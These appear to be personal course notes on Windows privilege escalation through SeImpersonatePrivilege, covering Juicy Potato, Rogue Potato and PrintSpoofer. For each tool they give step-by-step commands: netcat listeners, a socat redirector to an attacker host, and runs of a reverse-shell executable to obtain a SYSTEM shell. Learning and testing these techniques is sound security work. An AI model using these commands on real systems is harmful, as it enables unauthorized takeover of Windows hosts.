**Rotten Potato**
intercept a SYSTEM ticket due to SeImpersonatePrivilege


**SeImpersonate and SeAssignPrimaryToken**
service accounts generally configured with these two
- allow the account to impersonate the access tokens of other users (including SYSTEM)
- **any user with these privileges can run exploits in this note**

[Centralized GitHub for Potatoes](https://github.com/AtvikSecurity/CentralizedPotatoes)




**Juicy Potato**
works in the same way as Rotten Potato just with more ways to exploit

1. Check privileges with `whoami /priv`
![](assets/Pasted%20image%2020260607150926.png)
- looking for `SeImpersonatePrivilege`


2. Set up listener
```
nc -lvnp <port>
```


3. Run JuicyPotato
```
.\JuicyPotato.exe -l 1337 -p C:\privesc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
- port (1337) must be available
- CLSID must be valid for current version of Windows
	- list available on [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
		- also contains PS script to find them
![](assets/Pasted%20image%2020260607151429.png)
![](assets/Pasted%20image%2020260607151437.png)




**Rogue Potato**
[Compiled Version](https://github.com/antonioCoco/RoguePotato/releases)

1. Need 3 Kali terminals here
	1. Set up socat redirector on Kali to direct 135 traffic to 9999
	2. Set another netcat listener to catch SYSTEM reverse shell
	3. Reverse shell w/ impersonate privs - runs Rogue Potato exploit
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim_IP>:9999
nc -lvnp <port>

.\RoguePotato -r <attacker_IP> -l 9999 -e "C:\privesc\reverse.exe"
```
- if attacker_IP and victim_IP don't work, switch them around - he wasn't clear
![](assets/Pasted%20image%2020260607152212.png)




**PrintSpoofer**
[GitHub](https://github.com/itm4n/PrintSpoofer)
- doesn't require port forwarding - entire exploit happens on target machine
	- if it doesn't work, then you can try to transfer and run cv_redist.64.exe - needs C++ redist (not sure if it'll work with just a reverse shell)


1. verify privileges
```
whoami /priv
```
- need `SeImpersonatePrivilege`


2. set up listener to catch SYSTEM shell
```
nc -lvnp <port>
```


3. Run PrintSpoofer exploit with reverse.exe (mfsvenom)
```
.\PrintSpoofer.exe -i -c "C:\privesc\reverse.exe"
```
![](assets/Pasted%20image%2020260607152804.png)
![](assets/Pasted%20image%2020260607152812.png)

